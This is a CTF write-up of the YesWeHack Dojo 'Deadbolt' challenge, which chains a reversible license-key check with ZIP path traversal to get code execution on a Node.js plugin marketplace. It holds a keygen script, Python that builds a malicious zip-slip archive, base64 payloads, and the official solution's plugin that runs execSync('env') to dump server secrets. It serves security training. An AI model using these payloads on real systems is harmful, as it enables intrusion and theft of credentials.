---
title: "Deadbolt – License Bypass & ZIP Traversal to RCE"
date: 2026-06-04
draft: false
description: "We chain a trivial license key bypass with a classic ZIP path traversal to get unauthenticated RCE on a Node.js plugin marketplace."
tags:
  - Yeswehack
  - ctf
categories:
  - DoJo
  - web
  - concepts
---

  # Deadbolt – License Bypass & ZIP Path Traversal to Remote Code Execution

  ## Description

  The application provides a plugin marketplace where users can upload ZIP archives containing JavaScript plugins. Uploaded archives are extracted into `/tmp/app/plugins/archive/` and plugins are subsequently loaded from `/tmp/app/plugins/`.

  The plugin upload functionality is protected by a license key validation workflow. However, the validation routine relies entirely on reversible arithmetic operations without any cryptographic secret, allowing attackers to generate valid license keys independently.

  Additionally, the ZIP extraction workflow does not properly sanitise archive entry paths. Because filenames containing relative traversal sequences (`../`) are accepted, attackers can escape the intended extraction directory and overwrite arbitrary files within the plugin directory.

  By chaining these two vulnerabilities together, an unauthenticated attacker can:

  - Forge a valid license key
  - Upload a malicious ZIP archive
  - Overwrite an existing plugin
  - Execute arbitrary JavaScript code on the server
  - Access sensitive environment variables such as `FLAG`

  This results in **Remote Code Execution (RCE)** within the Node.js application context.

  Dojo link - https://dojo-yeswehack.com/challenge-of-the-month/dojo-51

  ## Exploitation

  ### 1. License Key Bypass

  The `validateKey()` function validates a license key using deterministic arithmetic conditions:

  - The key must contain 16 hexadecimal characters
  - The first nibble of Segment 1 must equal `0xA` or `0xC`
  - `(Segment2 ^ (Segment1 & 0xFF)) & 0xFF == 0x37`
  - `Segment3 % 7 == 0`
  - `Segment4 == ((Segment1 ^ Segment2 ^ Segment3) * 1103515245 + 1337) & 0xFFFF`

  Because no secret value or cryptographic signature is involved, the constraints can be solved directly.

  The following values satisfy all checks:

  - `Segment1 = 0xA000`
  - `Segment2 = 0x0037`
  - `Segment3 = 0x0000`
  - `Segment4 = calculated`

  Resulting valid key:
  ```A00000370000FEA4```


This bypasses the license validation mechanism completely.

### 2. Crafting the Malicious ZIP Archive

The application extracts uploaded ZIP archives into:

```text
/tmp/app/plugins/archive/
```

However, ZIP entry filenames are not sanitised before extraction.

A malicious ZIP archive can therefore contain a filename such as:

```text
../gitlab.js
```

When extracted, this resolves to:

```text
/tmp/app/plugins/archive/../gitlab.js
```

Which becomes:

```text
/tmp/app/plugins/gitlab.js
```

This overwrites the legitimate plugin with attacker-controlled JavaScript code.

### 3. Achieving Remote Code Execution

The malicious plugin exports JavaScript code that accesses environment variables through `process.env.FLAG`.

Once the application loads the overwritten plugin, the attacker-controlled code executes automatically within the Node.js runtime.

This demonstrates arbitrary code execution and server-side secret disclosure.

### 4. Sending the Exploit Payload

The malicious ZIP archive is base64-encoded and submitted to the application together with the forged license key.

Because both vulnerabilities are exploitable remotely and require no prior authentication, the attack can be executed entirely by an unauthenticated attacker.

## PoC

### Step 1 – Generate a Valid License Key

```javascript
let A = 0xA000;
let B = ((A & 0xFF) ^ 0x37);
let C = 0;

let seed = (A ^ B ^ C) & 0xFFFF;
let D = (Math.imul(seed, 1103515245) + 1337) & 0xFFFF;

let key = [A, B, C, D]
  .map(v => v.toString(16).padStart(4, '0').toUpperCase())
  .join('');

console.log(key);
```

```text
A00000370000FEA4
```

### Step 2 – Generate the Malicious ZIP Archive

```python
import zipfile
import base64
import io

malicious_code = b'''
const flag = process.env.FLAG;

class Plugin {
  constructor() {
    this.name = flag;
    this.desc = '';
    this.category = '';
    this.code = '';
    this.icon = '';
  }

  run() {
    eval(this.code);
  }

  getName() {
    return this.name;
  }

  get() {
    return {
      name: this.name,
      desc: this.desc,
      category: this.category,
      icon: this.icon,
      code: this.code,
    };
  }
}

module.exports = new Plugin();
'''

buf = io.BytesIO()

with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('../gitlab.js', malicious_code)

zip_b64 = base64.b64encode(buf.getvalue()).decode()

print(zip_b64)
```

Base64 ZIP Payload

```Base64
UEsDBBQAAAAIAHwZvVzJTnHLzAAAAKwBAAAMAAAALi4vZ2l0bGFiLmpzZZBLDsIgFEXnrOLNbBPTBdA4cKITY9wCoU9sQqHhUzWmexf6AT8DBhwuvHsgXCvr4CqZgB30RnO0tkI1VIfT/lgTLpm1cJFetApeBGDKG8+dNkU5EQB3a22lWIfhifhSnWmDlge62XwwzhwKbZ5/XDf4y9owL7ExLONVnAs4MFmka2U9HQp051BjChh03qjcLSVS7SUxbwBiiOb8dsHRgGaZFa8S9NtpPY69aVZIt0JXmm1nPM5uI+l04yVW+Oi1cTZoK7wvf1+UNXkDUEsBAhQDFAAAAAgAfBm9XMlOccvMAAAArAEAAAwAAAAAAAAAAAAAAIABAAAAAC4uL2dpdGxhYi5qc1BLBQYAAAAAAQABADoAAAD2AAAAAAA=
```

### Step 3 – Start Exploit 

License Key
```text
A00000370000FEA4
```
Plugin Name

```Blank```

Base64 ZIP Payload

```text
UEsDBBQAAAAIAHwZvVzJTnHLzAAAAKwBAAAMAAAALi4vZ2l0bGFiLmpzZZBLDsIgFEXnrOLNbBPTBdA4cKITY9wCoU9sQqHhUzWmexf6AT8DBhwuvHsgXCvr4CqZgB30RnO0tkI1VIfT/lgTLpm1cJFetApeBGDKG8+dNkU5EQB3a22lWIfhifhSnWmDlge62XwwzhwKbZ5/XDf4y9owL7ExLONVnAs4MFmka2U9HQp051BjChh03qjcLSVS7SUxbwBiiOb8dsHRgGaZFa8S9NtpPY69aVZIt0JXmm1nPM5uI+l04yVW+Oi1cTZoK7wvf1+UNXkDUEsBAhQDFAAAAAgAfBm9XMlOccvMAAAArAEAAAwAAAAAAAAAAAAAAIABAAAAAC4uL2dpdGxhYi5qc1BLBQYAAAAAAQABADoAAAD2AAAAAAA=
```
![Exploit](/images/deadbolt/dojo2.png)


Done! We solve the dojo  

![Exploit](/images/deadbolt/dojo1.png)


# Official Solution from YesWeHack Team 

Hey!

Congrats, you captured the flag! 🚩
Thank you for taking part in this monthly Dojo challenge, we hope you enjoyed it!
Official payload

You can find the official guide on how to solve the challenge Deadbolt below!

To generated valid key, we can analyze the function from the challenge and come up with out own key generator script:


```javascript
const A = 0xA000;

const B = (0x37 ^ (A & 0xFF)) & 0xFFFF;

const C = 0x0000;

const seed = (A ^ B ^ C) & 0xFFFF;

const D = (Math.imul(seed, 1103515245) + 1337) & 0xFFFF;

console.log([A,B,C,D].map(v => v.toString(16).padStart(4,'0').toUpperCase()).join('-'));
```

key :

```text
A000-0037-0000-FEA4
```

```plugin```

exploit
```python
zipbase64
Content of our malicious plugin (exploit code) added to the file: exploit.js:

class Plugin {
  constructor(name, desc, category, code, icon) {
    this.name = name;
    this.desc = desc;
    this.category = category;
    this.code = code;
    this.icon = icon;
  }
  run() {
    eval(this.code);
  }
  getName() {
    return this.name
  }
  get() {
    return {
      name: this.name,
      desc: this.desc,
      category: this.category,
      icon: this.icon,
      code: this.code,
    };
  }
}

const plugin = new Plugin(
  "exploit",
  "x",
  "y",
  "import('child_process').then((c)=>{console.log(c.execSync('env').toString())})",
  "",
);

module.exports = plugin;
```

When having the exploit code in a file you can use the tool: https://github.com/avlidienbrunn/archivealchemist, to make a Zip slip exploit and base64 encode it using the following command:

```text
python3 archive-alchemist.py zipslip.zip add "../exploit.js" --content "$(cat exploit.js)" && cat zipslip.zip | base64 -w 0 
```

output
```text
UEsDBBQAAAAAAAAAIQDcWU74UQIAAFECAAANAAAALi4vZXhwbG9pdC5qc2NsYXNzIFBsdWdpbiB7CiAgY29uc3RydWN0b3IobmFtZSwgZGVzYywgY2F0ZWdvcnksIGNvZGUsIGljb24pIHsKICAgIHRoaXMubmFtZSA9IG5hbWU7CiAgICB0aGlzLmRlc2MgPSBkZXNjOwogICAgdGhpcy5jYXRlZ29yeSA9IGNhdGVnb3J5OwogICAgdGhpcy5jb2RlID0gY29kZTsKICAgIHRoaXMuaWNvbiA9IGljb247CiAgfQogIHJ1bigpIHsKICAgIGV2YWwodGhpcy5jb2RlKTsKICB9CiAgZ2V0TmFtZSgpIHsKICAgIHJldHVybiB0aGlzLm5hbWUKICB9CiAgZ2V0KCkgewogICAgcmV0dXJuIHsKICAgICAgbmFtZTogdGhpcy5uYW1lLAogICAgICBkZXNjOiB0aGlzLmRlc2MsCiAgICAgIGNhdGVnb3J5OiB0aGlzLmNhdGVnb3J5LAogICAgICBpY29uOiB0aGlzLmljb24sCiAgICAgIGNvZGU6IHRoaXMuY29kZSwKICAgIH07CiAgfQp9Cgpjb25zdCBwbHVnaW4gPSBuZXcgUGx1Z2luKAogICJleHBsb2l0IiwKICAieCIsCiAgInkiLAogICJpbXBvcnQoJ2NoaWxkX3Byb2Nlc3MnKS50aGVuKChjKT0+e2NvbnNvbGUubG9nKGMuZXhlY1N5bmMoJ2VudicpLnRvU3RyaW5nKCkpfSkiLAogICIiLAopOwoKbW9kdWxlLmV4cG9ydHMgPSBwbHVnaW47UEsBAhQDFAAAAAAAAAAhANxZTvhRAgAAUQIAAA0AAAAAAAAAAAAAAKSBAAAAAC4uL2V4cGxvaXQuanNQSwUGAAAAAAEAAQA7AAAAfAIAAAAA
```

Happy hacking! 😃

Best regards,
YesWeHack / Brumens